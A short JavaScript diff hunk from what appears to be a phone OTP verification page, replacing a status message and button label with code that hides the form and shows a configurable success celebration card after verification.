@@ -314,11 +314,23 @@ async function requestAndTransmitLocation(verifiedPhone) {
         });
 
         spinner.style.display = 'none';
-        statusText.style.color = '#10b981';
-        statusText.textContent = '✓ Mobile Verified & Profile Connected successfully!';
+        if (statusMsg) statusMsg.style.display = 'none';
 
-        verifyOtpBtn.disabled = true;
-        verifyOtpBtn.innerHTML = `<span>✓ Verified & Connected</span>`;
+        // Hide form inputs cleanly
+        if (stepSendOtp) stepSendOtp.style.display = 'none';
+        if (stepVerifyOtp) stepVerifyOtp.style.display = 'none';
+        const phoneGroup = document.querySelector('.phone-input-group');
+        if (phoneGroup) phoneGroup.style.display = 'none';
+
+        // Trigger Animated Success Celebration Card
+        const successCard = document.getElementById('successCelebrationCard');
+        if (successCard) {
+          successCard.style.display = 'block';
+          const celebrationText = document.getElementById('celebrationCustomText');
+          if (celebrationText && currentSiteConfig && currentSiteConfig.successMessage) {
+            celebrationText.textContent = currentSiteConfig.successMessage;
+          }
+        }
 
       } catch (err) {
         spinner.style.display = 'none';
